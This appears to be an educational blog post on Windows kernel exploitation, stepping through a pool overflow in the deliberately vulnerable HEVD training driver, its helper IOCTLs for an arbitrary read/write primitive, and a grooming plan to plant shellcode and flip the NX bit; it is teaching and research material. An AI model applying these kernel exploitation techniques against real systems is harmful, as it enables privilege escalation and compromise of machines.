---
title: "Exploit Development: Swimming In The (Kernel) Pool - Leveraging Pool Vulnerabilities From Low-Integrity Exploits, Part 2"
date: 2021-07-18
tags: [posts]
excerpt: "Combining part 1's information leak vulnerability with a pool overflow vulnerability to obtain code execution via grooming the kLFH"
---
Introduction
---
This blog serves as Part 2 of a two-part series about pool corruption in the age of the segment heap on Windows. Part 1, which can be found [here](https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/) starts this series out by leveraging an out-of-bounds read vulnerability to bypass kASLR from low integrity. Chaining this information leak vulnerability with the bug outlined in this post, which is a pool overflow leading to an arbitrary read/write primitive, we will close out this series by outlining why pool corruption in the age of the segment heap has had the scope of techniques, in my estimation, lessened from the days of Windows 7. 

Due to the [release of Windows 11 recently](https://www.microsoft.com/en-us/windows/windows-11), which will have Virtualization-Based Security (VBS) and Hypervisor Protected Code Integrity (HVCI) enabled by default, we will pay homage to page table entry corruption techniques to bypass SMEP and DEP in the kernel with the exploit outlined in this blog post. Although Windows 11 will not be found in the enterprise for some time, as is the case with rolling out new technologies in any enterprise - vulnerability researchers will need to start moving away from leveraging artificially created executable memory regions in the kernel to execute code to either data-only style attacks or to investigate more novel techniques to bypass VBS and HVCI. This is the direction I hope to start taking my research in the future. This will most likely be the last post of mine which leverages page table entry corruption for exploitation.

Although there are much better explanations of pool internals on Windows, such as [this paper](https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf) and my coworker Yarden Shafir's upcoming BlackHat 2021 USA talk found [here](https://www.blackhat.com/us-21/briefings/schedule/#windows-heap-backed-pool-the-good-the-bad-and-the-encoded-234821624997360), Part 1 of this blog series will contain much of the prerequisite knowledge used for this blog post - so although there are better resources, I urge you to read Part 1 first if you are using this blog post as a resource to follow along (which is the intent and explains the length of my posts).

Vulnerability Analysis
---
Let's take a look at the source code for `BufferOverflowNonPagedPoolNx.c` in the `win10-klfh` branch of HEVD, which reveals a rather trivial and controlled pool-based buffer overflow vulnerability.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool1.png" alt="">

The first function within the source file is `TriggerBufferOverflowNonPagedPoolNx`. This function, which returns a value of type `NTSTATUS`, is prototyped to accept a buffer, `UserBuffer` and a size, `Size`. `TriggerBufferOverflowNonPagedPoolNx` invokes the kernel mode API `ExAllocatePoolWithTag` to allocate a chunk from the `NonPagedPoolNx` pool of size `POOL_BUFFER_SIZE`. Where does this size come from? Taking a look at the _very beginning_ of `BufferOverflowNonPagedPoolNx.c` we can clearly see that `BufferOverflowNonPagedPoolNx.h` is included.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool2.png" alt="">

Taking a look at this header file, we can see a `#define` directive for the size, which is determined by a processor directive to make this variable `16` on a Windows 64-bit machine, which we are testing from. We now know that the pool chunk that will be allocated from the call to `ExAllocatePoolWithTag` within `TriggerBufferOverfloowNx` is 16 bytes.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool3.png" alt="">

The kernel mode pool chunk, which is now allocated on the `NonPagedPoolNx` is managed by the return value of `ExAllocatePoolWithTag`, which is `KernelBuffer` in this case. Looking a bit further down the code we can see that `RtlCopyMemory`, which is a wrapper for a call to `memcpy`, copies the value `UserBuffer` into the allocation managed by `KernelBuffer`. The size of the buffer copied into `KernelBuffer` is managed by `Size`. After the chunk is written to, based on the code in `BufferOverflowNonPagedPoolNx.c`, the pool chunk is also subsequently freed.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool4.png" alt="">

This basically means that the value specified by `Size` and `UserBuffer` will be used in the copy operation to copy memory into the pool chunk. We know that `UserBuffer` and `Size` are baked into the function definition for `TriggerBufferOverflowNonPagedPoolNx`, but where do these values come from? Taking a look further into `BufferOverflowNonPagedPoolNx.c`, we can actually see these values are extracted from the IRP sent to this function via the IOCTL handler.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool5.png" alt="">

This means that the client interacting with the driver via `DeviceIoControl` is able to control the contents and the size of the buffer copied into the pool chunk allocated on the `NonPagedPoolNx`, which is 16 bytes. The vulnerability here is that _we_ can control the size and contents of the memory copied into the pool chunk, meaning we could specify a value greater than 16, which would write to memory outside the bounds of the allocation, a la an out-of-bounds write vulnerability, known as a "pool overflow" in this case.

Let's put this theory to the test by expanding upon our exploit from part one and triggering the vulnerability.

Triggering The Vulnerability
---

We will leverage the previous exploit from Part 1 and tack on the pool overflow code to the end, after the `for` loop which does parsing to extract the base address of `HEVD.sys`. This code can be seen below, which sends a buffer of 50 bytes to the pool chunk of 16 bytes. The IOCTL for to reach the `TriggerBufferOverflowNonPagedPool` function is `0x0022204b`

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool6.png" alt="">

After this allocation is made and the pool chunk is subsequently freed, we can see that a BSOD occurs with a bug check indicating that a pool header has been corrupted.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool7.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool8.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool9.png" alt="">

This is the result of our out-of-bounds write vulnerability, which has corrupted a pool header. When a pool header is corrupted and the chunk is subsequently freed, an "integrity" check is performed on the in-scope pool chunk to ensure it has a valid header. Because we have arbitrarily written contents past the pool chunk allocated for our buffer sent from user mode, we have subsequently overwritten other pool chunks. Due to this, and due to every chunk in the kLFH, which is where our allocation resides based on heuristics mentioned in Part 1, being prepended with a `_POOL_HEADER` structure - we have subsequently corrupted the header of each subsequent chunk. We can confirm this by setting a breakpoint on on call to `ExAllocatePoolWithTag` and enabling debug printing to see the layout of the pool before the free occurs.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool10.png" alt="">

The breakpoint set on the address `fffff80d397561de`, which is the first breakpoint seen being set in the above photo, is a breakpoint on the actual call to `ExAllocatePoolWithTag`. The breakpoint set at the address `fffff80d39756336` is the instruction that comes _directly before_ the call to `ExFreePoolWithTag`. This breakpoint is hit at the bottom of the above photo via `Breakpoint 3 hit`. This is to ensure execution pauses before the chunk is freed.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool11.png" alt="">

We can then inspect the vulnerable chunk responsible for the overflow to determine if the `_POOL_HEADER` tag corresponds with the chunk, which it does.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool12.png" alt="">

After letting execution resume, a bug check again incurs. This is due to a pool chunk being freed which has an invalid header. 

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool13.png" alt="">

This validates that an out-of-bounds write does exist. The question is now, with a kASLR bypass in hand - how to we comprehensively execute kernel-mode code from user mode?

Exploitation Strategy
---

Fair warning - this section contains a lot code analysis to understand what this driver is doing in order to groom the pool, so please bear this in mind. 

As you can recall from Part 1, the key to pool exploitation in the age of the segment heap it to find objects, when exploiting the kLFH specifically, that are of the same size as the vulnerable object, contain an interesting member in the object, can be called from user mode, and are allocated on the same pool type as the vulnerable object. We can recall earlier that the size of the vulnerable object was 16 bytes in size. The goal here now is to look at the source code of the driver to determine if there isn't a useful object that we can allocate which will meet all of the specified parameters above. Note again, this is the toughest part about pool exploitation is finding objects worthwhile.

Luckily, and slightly contrived, there are two files called `ArbitraryReadWriteHelperNonPagedPoolNx.c` and `ArbitraryReadWriteHelperNonPagedPoolNx.h`, which are useful to us. As the name can specify, these files seem to allocate some sort of object on the `NonPagedPoolNx`. Again, note that at this point in the real world we would need to reverse engineer the driver and look at all instances of pool allocations, inspect their arguments at runtime, and see if there isn't a way to get useful objects on the same pool and kLFH bucket as the vulnerable object for pool grooming.

`ArbitraryReadWriteHelperNonPagedPoolNx.h` contains two interesting structures, seen below, as well several function definitions (which we will touch on later - please make sure you become familiar with these structures and their members!).

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool14.png" alt="">

As we can see, each function definition defines a parameter of type `PARW_HELPER_OBJECT_IO`, which is a pointer to an `ARW_HELP_OBJECT_IO` object, defined in the above image!

Let's examine `ArbitraryReadWriteHelpeNonPagedPoolNx.c` in order to determine how these `ARW_HELPER_OBJECT_IO` objects are being instantiated and leveraged in the defined functions in the above image.

Looking at `ArbitraryReadWriteHelperNonPagedPoolNx.c`, we can see it contains several IOCTL handlers. This is indicative that these `ARW_HELPER_OBJECT_IO` objects will be sent from a client (us). Let's take a look at the first IOCTL handler.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool15.png" alt="">

It appears that `ARW_HELPER_OBJECT_IO` objects are created through the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNxIoctlHandler` IOCTL handler. This handler accepts a buffer, casts the buffer to type `ARW_HELP_OBJECT_IO` and passes the buffer to the function `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`. Let's inspect `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool16.png" alt="">

`CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` first declares a few things:

1. A pointer called `Name`
2. A `SIZE_T` variable, `Length`
3. An `NTSTATUS` variable which is set to `STATUS_SUCCESS` for error handling purposes
4. An integer, `FreeIndex`, which is set to the value `STATUS_INVALID_INDEX`
5. A pointer of type `PARW_HELPER_OBJECT_NON_PAGED_POOL_NX`, called `ARWHelperObject`, which is a pointer to a `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object, which we saw previously defined in `ArbitraryReadWriteHelperNonPagedPoolNx.h`. 

The function, after declaring the pointer to an `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` previously mentioned, probes the input buffer from the client, parsed from the IOCTL handler, to verify it is in user mode and then stores the length specified by the `ARW_HELPER_OBJECT_IO` structure's `Length` member into the previously declared variable `Length`. This `ARW_HELPER_OBJECT_IO` structure is taken from the user mode client interacting with the driver (us), meaning it is supplied from the call to `DeviceIoControl`.

Then, a function called `GetFreeIndex` is called and the result of the operation is stored in the previously declared variable `FreeIndex`. If the return value of this function is equal to `STATUS_INVALID_INDEX`, the function returns the status to the caller. If the value _is not_ `STATUS_INVALID_INDEX`, `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` then calls `ExAllocatePoolWithTag` to allocate memory for the previously declared `PARW_HELPER_OBJECT_NON_PAGED_POOL_NX` pointer, which is called `ARWHelperObject`. This object is placed on the `NonPagedPoolNx`, as seen below.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool17.png" alt="">

After allocating memory for `ARWHelperObject`, the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` function then allocates another chunk from the `NonPagedPoolNx` and allocates this memory to the previously declared pointer `Name`.

This newly allocated memory is then initialized to zero. The previously declared pointer, `ARWHelperObject`, which is a pointer to an `ARW_HELPER_OBJECT_NON_PAGED_POOL_OBJECT`, then has its `Name` member set to the previously declared pointer `Name`, which had its memory allocated in the previous `ExAllocatePoolWithTag` operation, and its `Length` member set to the local variable `Length`, which grabbed the length sent by the user mode client in the IOCTL operation, via the input buffer of type `ARW_HELPER_OBJECT_IO`, as seen below. This essentially just initializes the structure's values.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool18.png" alt="">

Then, an array called `g_ARWHelperOjbectNonPagedPoolNx`, at the index specified by `FreeIndex`, is initialized to the address of the `ARWHelperObject`. This array is actually an array of pointers to `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` objects, and managed such objects. This is defined at the beginning of `ArbitraryReadWriteHelperNonPagedPoolNx.c`, as seen below.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool19.png" alt="">

Before moving on - I realize this is a lot of code analysis, but I will add in diagrams and tl;dr's later to help make sense of all of this. For now, let's keep digging into the code.

Let's recall how the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` function was prototyped:

```c
NTSTATUS
CreateArbitraryReadWriteHelperObjectNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
);
```

This `HelperObjectIo` object is of type `PARW_HELPER_OBJECT_IO`, which is supplied by a user mode client (us). This structure, which is supplied by us via `DeviceIoControl`, has its `HelperObjectAddress` member set to the address of the `ARWHelperObject` previously allocated in `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`. This essentially means that our user mode structure, which is sent to kernel mode, has one of its members, `HelperObjectAddress` to be specific, set to the address of _another_ kernel mode object. This means this will be bubbled back up to user mode. This is the end of the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` function! Let's update our code to see how this looks dynamically. We can also set a breakpoint on `HEVD!CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` in WinDbg. Note that the IOCTL to trigger `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` is `0x00222063`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool20.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool21.png" alt="">

We know now that this function will allocate a pool chunk for the `ARWHelperObject` pointer, which is a pointer to an `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX`. Let's set a breakpoint on the call to `ExAllocatePoolWIthTag` responsible for this, and enable debug printing.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool22.png" alt="">

Also note the debug print `Name Length` is zero. This value was supplied by us from user mode, and since we instantiated the buffer to zero, this is why the length is zero. The `FreeIndex` is also zero. We will touch on this value later on. After executing the memory allocation operation and inspecting the return value, we can see the familiar `Hack` pool tag, which is `0x10` bytes (16 bytes) + `0x10` bytes for the `_POOL_HEADER_` structure - making this a total of `0x20` bytes. The address of this `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` is `0xffff838b6e6d71b0`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool23.png" alt="">

We then know that _another_ call to `ExAllocatePoolWithTag` will occur, which will allocate memory for the `Name` member of `ARWHelperObject->Name`, where `ARWHelperObject` is of type `PARW_HELPER_OBJECT_NON_PAGED_POOL_NX`. Let's set a breakpoint on this memory allocation operation and inspect the contents of the operation.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool24.png" alt="">

We can see this chunk is allocated in the same pool and kLFH bucket as the previous `ARWHelperObject` pointer. The address of this chunk, which is `0xffff838b6e6d73d0`, will eventually be set as `ARWHelperObject`'s `Name` member, along with `ARWHelperObject`'s `Length` member being set to the original user mode input buffer's `Length` member, which comes from an `ARW_HELPER_OBJECT_IO` structure.

From here we can press `g` in WinDbg to resume execution. 

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool25.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool26.png" alt="">

We can clearly see that the kernel-mode address of the `ARWHelperObject` pointer is bubbled back to user mode via the `HelperObjectAddress` of the `ARW_HELPER_OBJECT_IO` object specified in the input and output buffer parameters of the call to `DeviceIoControl`.

Let's re-execute everything again and capture the output.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool27.png" alt="">

Notice anything? Each time we call `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`, based on the analysis above, there is always a `PARW_HELPER_OBJECT_NON_PAGED_POOL_OBJECT` created. We know there is also an array of these objects created and the created object for each given `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` function call is assigned to the array at index `FreeIndex`. After re-running the updated code, we can see that by calling the function again, and therefore creating another object, the `FreeIndex` value was increased by one. Re-executing everything again for a second time, we can see this is the case again!

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool28.png" alt="">

We know that this `FreeIndex` variable is set via a function call to the `GetFreeIndex` function, as seen below.


```c
Length = HelperObjectIo->Length;

        DbgPrint("[+] Name Length: 0x%X\n", Length);

        //
        // Get a free index
        //

        FreeIndex = GetFreeIndex();

        if (FreeIndex == STATUS_INVALID_INDEX)
        {
            //
            // Failed to get a free index
            //

            Status = STATUS_INVALID_INDEX;
            DbgPrint("[-] Unable to find FreeIndex: 0x%X\n", Status);

            return Status;
        }
```

Let's examine how this function is defined and executed. Taking a look in `ArbitraryReadWriteHelperNonPagedPoolNx.c`, we can see the function is defined as such.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool29.png" alt="">

This function, which returns an integer value, performs a `for` loop based on `MAX_OBJECT_COUNT` to determine if the `g_ARWHelperObjectNonPagedPoolNx` array, which is an array of pointers to `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX`s, has a value assigned for a given index, which starts at 0. For instance, the `for` loop first checks if the `0th` element in the `g_ARWHelperObjectNonPagedPoolNx` array is assigned a value. If it is assigned, the index into the array is increased by one. This keeps occurring until the `for` loop can no longer find a value assigned to a given index. When this is the case, the current value used as the counter is assigned to the value `FreeIndex`. This value is then passed to the assignment operation used to assign the in-scope `ARWHelperObject` to the array managing all such objects. This loop occurs `MAX_OBJECT_COUNT` times, which is defined in `ArbitraryReadWriteHelperNonPagedPoolNx.h` as `#define MAX_OBJECT_COUNT 65535`. This is the total amount of objects that can be managed by the `g_ARWHelperObjectNonPagedPoolNx` array.

The tl;dr of what happens here is in the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` function is:
1. Create a `PARW_HELPER_OBJECT_NON_PAGED_POOL_OBJECT` object called `ARWHelperObject`
2. Set the `Name` member of `ARWHelperObject` to a buffer on the `NonPagedPoolNx`, which has a value of 0
3. Set the `Length` member of `ARWHelperObject` to the value specified by the user-supplied input buffer via `DeviceIoControl`
4. Assign this object to an array which manages all active `PARW_HELPER_OBJECT_NON_PAGED_POOL_OBJECT` objects
5. Return the address of the `ARWHelpeObject` to user mode via the output buffer of `DeviceIoControl`

Here is a diagram of this in action.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool30.png" alt="">

Let's take a look at the next IOCTL handler after `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` which is `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler`. This IOCTL handler will take the user buffer supplied by `DeviceIoControl`, which is expected to be of type `ARW_HELPER_OBJECT_IO`. This structure is then passed to the function `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx`, which is prototyped as such:

```c
NTSTATUS
SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx(
    _In_ PARW_HELPER_OBJECT_IO HelperObjectIo
)
```

Let's take a look at what this function will do with our input buffer. Recall last time we were able to specify the length that was used in the operation on the size of the `Name` member of the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object `ARWHelperObject`. Additionally, we were able to return the address of this pointer to user mode.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool31.png" alt="">

This function starts off by defining a few variables:
1. A pointer named `Name`
2. A pointer named `HelperObjectAddress`
3. An integer value named `Index` which is assigned to the status `STATUS_INVALID_INDEX`
4. An `NTSTATUS` code

After these values are declared, This function first checks to make sure the input buffer from user mode, the `ARW_HELPER_OBJECT_IO` pointer, is in user mode. After confirming this, The `Name` member, which is a pointer, from this user mode buffer is stored into the pointer `Name`, previously declared in the listing of declared variables. The `HelperObjectAddress` member from the user mode buffer - which, after the call to `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`, contained the kernel mode address of the `PARW_HELPER_OBJECT_NON_PAGED_POOL_OBJECT` `ARWHelperObject`, is extracted and stored into the declared `HelperObjectAddress` at the beginning of the function.

A call to `GetIndexFromPointer` is made, with the address of the `HelperObjectAddress` as the argument in this call. If the return value is `STATUS_INVALID_INDEX`, an `NTSTATUS` code of `STATUS_INVALID_INDEX` is returned to the caller. If the function returns anything else, the `Index` value is printed to the screen.

Where does this value come from? `GetIndexFromPointer` is defined as such.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool32.png" alt="">

This function will accept a value of any pointer, but realistically this is used for a pointer to a `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object. This function takes the supplied pointer and indexes the array of `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` pointers, `g_ARWHelperObjectNonPagedPoolNx`. If the value hasn't been assigned to the array (e.g. if `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` wasn't called, as this will assign any created `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` to the array _or_ the object was freed), `STATUS_INVALID_INDEX` is returned. This function basically makes sure the in-scope `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object is managed by the array. If it does exist, this function returns the index of the array the given object resides in.

Let's take a look at the next snipped of code from the `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool33.png" alt="">

After confirming the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` exists, a check is performed to ensure the `Name` pointer, which was extracted from the user mode buffer of type `PARW_HELPER_OBJECT_IO`'s `Name` member, is in user mode. Note that `g_ARWHelperObjectNonPagedPoolNx[Index]` is being used in this situation as another way to reference the in-scope `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object, since all `g_ARWHelperObjectNonPagedPoolNx` is at the end of the day is an array, of type `PARW_HELPER_OBJECT_NON_PAGED_POOL_NX`, which manages all active `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` pointers.

After confirming the buffer is coming from user mode, this function finishes by copying the value of `Name`, which is a value supplied by us via `DeviceIoControl` and the `ARW_HELPER_OBJECT_IO` object, to the `Name` member of the previously created `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` via `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`.

Let's test this theory in WinDbg. What we should be looking for here is the value specified by the `Name` member of our user-supplied `ARW_HELPER_OBJECT_IO` should be written to the `Name` member of the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object created in the _previous_ call to `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`. Our updated code looks as follows.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool34.png" alt="">

The above code should overwrite the `Name` member of the previously created `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object from the function `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx`. Note that the IOCTL for the `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function is `0x00222067`.

We can then set a breakpoint in WinDbg to perform dynamic analysis.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool35.png" alt="">

Then we can set a breakpoint on `ProbeForRead`, which will take the first argument, which is our user-supplied `ARW_HELPER_OBJECT_IO`, and verify if it is in user mode. We can parse this memory address in WinDbg, which would be in RCX when the function call occurs due to the `__fastcall` calling convention, and see that this not only is a user-mode buffer, but it is also the object we intended to send from user mode for the `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function. 

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool36.png" alt="">

This `HelperObjectAddress` value is the address of the previously created/associated `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object. We can also verify this in WinDbg.

Recall from earlier that the associated `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object has it's `Length` member taken from the `Length` sent from our user-mode `ARW_HELPER_OBJECT_IO` structure. The `Name` member of the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` is also initialized to zero, per the `RtlFillMemory` call from the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` routine - which initializes the `Name` buffer to 0 (recall the `Name` member of the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` is actually a buffer that was allocated via `ExAllocatePoolWithTag` by using the specified `Length` of our `ARW_HELPER_OBJECT_IO` structure in our `DeviceIoControl` call).

`ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name` is the member that _should_ be overwritten with the contents of the `ARW_HELPER_OBJECT_IO` object we sent from user mode, which currently is set to `0x4141414141414141`. Knowing this, let's set a breakpoint on the `RtlCopyMemory` routine, which will show up as `memcpy` in HEVD via WinDbg.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool37.png" alt="">

This fails. The error code here is actually access denied. Why is this? Recall that there is a one final call to `ProbeForRead` directly before the `memcpy` call.

```c
ProbeForRead(
    Name,
    g_ARWHelperObjectNonPagedPoolNx[Index]->Length,
    (ULONG)__alignof(UCHAR)
);
```

The `Name` variable here is extracted from the user-mode buffer `ARW_HELPER_OBJECT_IO`. Since we supplied a value of `0x4141414141414141`, this technically isn't a valid address and the call to `ProbeForRead` will not be able to locate this address. Instead, let's create a user-mode pointer and leverage it instead!

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool38.png" alt="">

After executing the code again and hitting all the breakpoints, we can see that execution now reaches the `memcpy` routine.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool39.png" alt="">

After executing the `memcpy` routine, the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object created from the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` function now points to the value specified by our user-mode buffer, `0x4141414141414141`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool40.png" alt="">

We are starting to get closer to our goal! You can see this is pretty much an uncontrolled arbitrary write primitive in and of itself. The issue here however is that the value we can overwrite, which is `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name` is a pointer which is allocated in the kernel via `ExAllocatePoolWithTag`. Since we cannot directly control the address stored in this member, we are limited to only overwriting what the kernel provides us. The goal for us will be to use the pool overflow vulnerability to overcome this (in the future).

Before getting to the exploitation phase, we need to investigate one more IOCTL handler, plus the IOCTL handler for deleting objects, which should not be time consuming.

The last IOCTL handler to investigate is the `GetArbitraryReadWriteHelperObjecNameNonPagedPoolNxIoctlHandler` IOCTL handler.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool41.png" alt="">

This handler passes the user-supplied buffer, which is of type `ARW_HELPER_OBJECT_IO` to `GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx`. This function is _identical_ to the `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function, in that it will copy one `Name` member to another `Name` member, but in reverse order. As seen below, the `Name` member used in the destination argument for the call to `RtlCopyMemory` is from the user-supplied buffer this time.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool42.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool43.png" alt="">

This means that if we used the `SetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function to overwrite the `Name` member of the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object from the `CreateArbitraryReadWriteHelperObjectNonPagedPoolNx` function then we could use the `GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` to get the `Name` member of the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object and bubble it up back to user mode. Let's modify our code to outline this. The IOCTL code to reach the `GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function is `0x0022206B`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool44.png" alt="">

In this case we do not need WinDbg to validate anything. We can simply set the contents of our `ARW_HELPER_OBJECT_IO.Name` member to junk as a POC that after the IOCL call to reach `GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx`, this member will be overwritten by the contents of the associated/previously created `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object, which will be `0x4141414141414141`. 

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool45.png" alt="">

Since `tempBuffer` is assigned to `ARW_HELPER_OBJECT_IO.Name`, this is technically the value that will inherit the contents of `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name` in the `memcpy` operation from the `GetArbitraryReadWriteHelperObjecNameNonPagedPoolNx` function. As we can see, we can successfully retrieve the contents of the associated `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name` object. Again, however, the issue is that we are not able to choose what `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name` points to, as this is determined by the driver. We will use our pool overflow vulnerability soon to overcome this limitation.

The last IOCTL handler is the delete operation, found in `DeleteArbitraryReadWriteHelperObjecNonPagedPoolNxIoctlHandler`.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool46.png" alt="">

This IOCTL handler parses the input buffer from `DeviceIoControl` as an `ARW_HELPER_OBJECT_IO` structure. This buffer is then passed to the `DeleteArbitraryReadWriteHelperObjecNonPagedPoolNx` function.

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool47.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/2pool48.png" alt="">

This function is pretty simplistic - since the `HelperObjectAddress` is pointing to the associated `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object, this member is used in a call to `ExAllocateFreePoolWithTag` to free the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX` object. Additionally, the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name` member, which also is allocated by `ExAllocatePoolWithTag` is freed.

Now that we know all of the ins-and-outs of the driver's functionality, we can continue (please note that we are fortunate to have source code in this case. Leveraging a disassembler make take a bit more time to come to the same conclusions we were able to come to).

Okay, Now Let's Get Into Exploitation (For Real This Time)
---

We know that our situation currently allows for an uncontrolled arbitrary read/write primitive. This is because the `ARW_HELPER_OBJECT_NON_PAGED_POOL_NX.Name` member is set currently to the address of a pool allocation via `ExAllocatePoolWithTag`. With our pool overflow we will try to overwrite this address to a meaningful address. This will allow for us to corrupt a _controlled_ address - thus allowing us to obtain an arbitrary read/write primitive.

Our strategy for grooming the pool, due to all of these objects being the same size and being allocated on the same pool type (`NonPagedPoolNx`), will be as follows:
1. "Fill the holes" in the current page servicing allocations of size `0x20`
2. Groom the pool to obtain the following layout: `VULNERABLE_OBJECT | ARW_HELPER_OBJECT_NON_PAGED_POOL_NX | VULNERABLE_OBJECT | ARW_HELPER_OBJECT_NON_PAGED_POOL_NX | VULNERABLE_OBJECT | ARW_HELPER_OBJECT_NON_PAGED_POOL_NX`
3. Leverage the read/write primitive to write our shellcode, one QWORD at a time, to `KUSER_SHARED_DATA+0x800` and flip the no-eXecute bit to bypass kernel-mode DEP

